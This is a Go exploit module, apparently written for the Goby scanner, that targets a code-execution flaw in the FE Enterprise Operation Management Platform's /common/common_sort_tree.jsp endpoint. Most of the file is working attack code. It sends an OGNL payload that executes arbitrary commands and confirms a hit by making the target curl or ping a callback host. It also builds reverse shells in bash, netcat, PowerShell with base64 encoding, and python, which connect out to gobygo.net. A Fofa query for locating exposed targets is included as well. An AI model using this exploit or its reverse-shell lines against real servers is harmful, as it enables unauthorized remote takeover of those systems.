package exploits

import (
	"encoding/base64"
	"errors"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
	"strings"
	"time"
	"unicode/utf16"
)

func init() {
	expJson := `{
    "Name": "FE-Collab-Platform /common_sort_tree.jsp Code Execution Vulnerability",
    "Description": "<p>FE Enterprise Operation Management Platform is a cloud workbench based on cloud computing, intelligence, big data, Internet of Things, mobile Internet and other technical support.</p><p>There is a code execution vulnerability in the interface of FE Enterprise Operation Management Platform/common_sort_tree.jsp, through which an attacker can arbitrarily execute code on the server, write it to the backdoor, obtain server permissions, and then control the entire web server.</p>",
    "Product": "FE-Collab-Platform",
    "Homepage": "https://www.flyrise.cn/",
    "DisclosureDate": "2023-10-26",
    "PostTime": "2024-09-26",
    "Author": "202205566302@smail.xtu.edu.cn",
    "FofaQuery": "body=\"js39/flyrise.stopBackspace.js\" || body=\"src=\\\"/js39/flyrise.dialog.js\" || body=\"src=\\\"/js39/external/jquery\" || body=\"/login/qr_code.jsp\"",
    "GobyQuery": "body=\"js39/flyrise.stopBackspace.js\" || body=\"src=\\\"/js39/flyrise.dialog.js\" || body=\"src=\\\"/js39/external/jquery\" || body=\"/login/qr_code.jsp\"",
    "Level": "2",
    "Impact": "<p>There is a code execution vulnerability in the interface of FE Enterprise Operation Management Platform/common_sort_tree.jsp, through which an attacker can arbitrarily execute code on the server, write it to the backdoor, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls. </p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,reverse",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        },
        {
            "name": "reverse",
            "type": "select",
            "value": "ByBash",
            "show": "attackType=reverse"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Code Execution",
        "2H1W"
    ],
    "VulType": [
        "Code Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.0",
    "Translation": {
        "CN": {
            "Name": "飞企互联FE企业运营管理平台 /common_sort_tree.jsp 代码执行漏洞",
            "Product": "FE-协作平台",
            "Description": "<p>飞企互联-FE企业运营管理平台是一个基于云计算、智能化、大数据、物联网、移动互联网等技术支撑的云工作台。</p><p>飞企互联-FE企业运营管理平台/common_sort_tree.jsp接口存在代码执行漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "Recommendation": "<p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。&nbsp;</p><p>2、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>飞企互联-FE企业运营管理平台/common_sort_tree.jsp接口存在代码执行漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "FE-Collab-Platform /common_sort_tree.jsp Code Execution Vulnerability",
            "Product": "FE-Collab-Platform",
            "Description": "<p>FE Enterprise Operation Management Platform is a cloud workbench based on cloud computing, intelligence, big data, Internet of Things, mobile Internet and other technical support.</p><p>There is a code execution vulnerability in the interface of FE Enterprise Operation Management Platform/common_sort_tree.jsp, through which an attacker can arbitrarily execute code on the server, write it to the backdoor, obtain server permissions, and then control the entire web server.</p>",
            "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls.&nbsp;</p><p>2. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>There is a code execution vulnerability in the interface of FE Enterprise Operation Management Platform/common_sort_tree.jsp, through which an attacker can arbitrarily execute code on the server, write it to the backdoor, obtain server permissions, and then control the entire web server.<br></p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution",
                "2H1W"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9956"
}`
	setPayloadRequestHashaasfciahscuihailsyufhcysdiahftybsduvasegerdsfgbsddg := func(hostInfo *httpclient.FixUrl, command string) (ok bool, vulURL string, err error) {
		//请注意：command字段是原始的命令，如果漏洞利用需要对命令进行编码，则需在此处编码

		//请注意：ok值为，true代表命令执行成功，false代表命令执行失败

		//请注意：vulURL 字段为检测后显示的风险路径，示例值为：/path/to/vulable.jsp
		vulURL = "/common/common_sort_tree.jsp;.js"
		requestConfig := httpclient.NewPostRequestConfig(vulURL)
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false
		requestConfig.Timeout = 10
		requestConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		//将command中的'转化为\'
		command = strings.Replace(command, "'", "\\'", -1)
		//command进行url编码
		command = url.QueryEscape(command)
		requestConfig.Data = "rootName={%25Thread.@java.lang.Runtime@getRuntime().exec('" + command + "')%25}"
		resp, err := httpclient.DoHttpRequest(hostInfo, requestConfig)
		if err != nil || resp.StatusCode != 500 {
			err = errors.New("failed to RCE")
			ok = false
			return ok, vulURL, err
		}
		ok = true
		return ok, vulURL, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			//请注意：在此处将setPayloadRequestHash0001函数赋值给runPayload
			runPayload := setPayloadRequestHashaasfciahscuihailsyufhcysdiahftybsduvasegerdsfgbsddg

			//请注意：后续代码为模板代码，非特殊情况，无需更改
			checkStr := goutils.RandomHexString(6)
			checkUrl, isDomain := godclient.GetGodCheckURL(checkStr)

			//请注意：若漏洞环境特殊，可自行修改为wget、或其他能够出发HTTPLog的命令，由于部分godserver没有域名，所以尽量使用HTTPLog的方式
			pocCommand := "curl " + checkUrl
			if isDomain {
				pocCommand = "ping " + checkUrl
			}

			ok, vulUrl, err := runPayload(hostInfo, pocCommand)
			if err != nil || !ok {
				return false
			}
			if godclient.PullExists(checkStr, time.Second*15) {
				ss.VulURL = hostInfo.FixedHostInfo + vulUrl
				return true
			}

			return false
		},
		//exp利用函数
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			//请注意：在此处将setPayloadRequestHash0001函数赋值给runPayload
			runPayload := setPayloadRequestHashaasfciahscuihailsyufhcysdiahftybsduvasegerdsfgbsddg

			//请注意：后续代码为模板代码，非特殊情况，无需更改
			setReverseWaitting := func(expResult *jsonvul.ExploitResult, waitSessionCh chan string) {
				select {
				case webConsleID := <-waitSessionCh:
					if u, err := url.Parse(webConsleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					} else {
						expResult.Success = false
						expResult.Output = "reverse shell fail"
					}
				case <-time.After(time.Second * 25):
				}
			}

			setReverseRequest := func(reverseType string) (string, chan string, error) {
				bypython := func(port string) string {
					return "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"gobygo.net\"," + port + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"bash\")'"
				}
				typeList := map[string]func(string) string{
					"ByBash":             godclient.ReverseTCPByBash,
					"ByBashBase64":       godclient.ReverseTCPByBash,
					"ByPowershell":       godclient.ReverseTCPByPowershell,
					"ByPowershellBase64": godclient.ReverseTCPByPowershell,
					"BySh":               godclient.ReverseTCPBySh,
					"ByNcBsd":            godclient.ReverseTCPByNcBsd,
					"Bypython":           bypython,
				}
				if revserTypeNew := typeList[reverseType]; revserTypeNew == nil {
					return "", nil, errors.New("vaild exsploit")
				}
				waitSessionCh := make(chan string)

				if strings.Contains(reverseType, "ByPowershell") {
					if rp, err := godclient.WaitSession("reverse_windows", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByPowershellBase64" {
							utf16Bytes := utf16.Encode([]rune(strings.TrimLeft(command, "powershell ")))
							bytes := make([]byte, len(utf16Bytes)*2)
							for i, v := range utf16Bytes {
								bytes[i*2] = byte(v)
								bytes[i*2+1] = byte(v >> 8)
							}
							command = "powershell -e " + base64.StdEncoding.EncodeToString(bytes)
						}
						return command, waitSessionCh, nil
					}
				} else {
					if rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByBash" {
							reRequest := regexp.MustCompile("(/dev/tcp/((.|\n)*?)/[0-9]+)")
							getserver := reRequest.FindStringSubmatch(command)
							command = "/bin/bash -c bash${IFS}-i${IFS}>&" + getserver[1] + "<&1"
						}
						if reverseType == "ByBashBase64" {
							command = "bash -c {echo," + base64.StdEncoding.EncodeToString([]byte(command)) + "}|{base64,-d}|{bash,-i}"
						}
						return command, waitSessionCh, nil
					}
				}
				return "", waitSessionCh, errors.New("gain command fail")
			}

			attackType := goutils.B2S(ss.Params["attackType"])
			switch attackType {
			case "cmd":
				//配置命令
				command := goutils.B2S(ss.Params["cmd"])
				ok, _, err := runPayload(expResult.HostInfo, command)
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}
				if !ok {
					expResult.Success = false
					expResult.Output = "执行失败"
				}
				expResult.Success = true
				expResult.Output = "执行成功,该漏洞无回显,请自行判断执行效果"
			case "reverse":
				//配置反弹shell的类型
				reversetype := goutils.B2S(ss.Params["reverse"])
				if command, waitSessionCh, err := setReverseRequest(reversetype); command != "" {
					go runPayload(expResult.HostInfo, command)
					setReverseWaitting(expResult, waitSessionCh)
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			default:
				expResult.Success = false
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
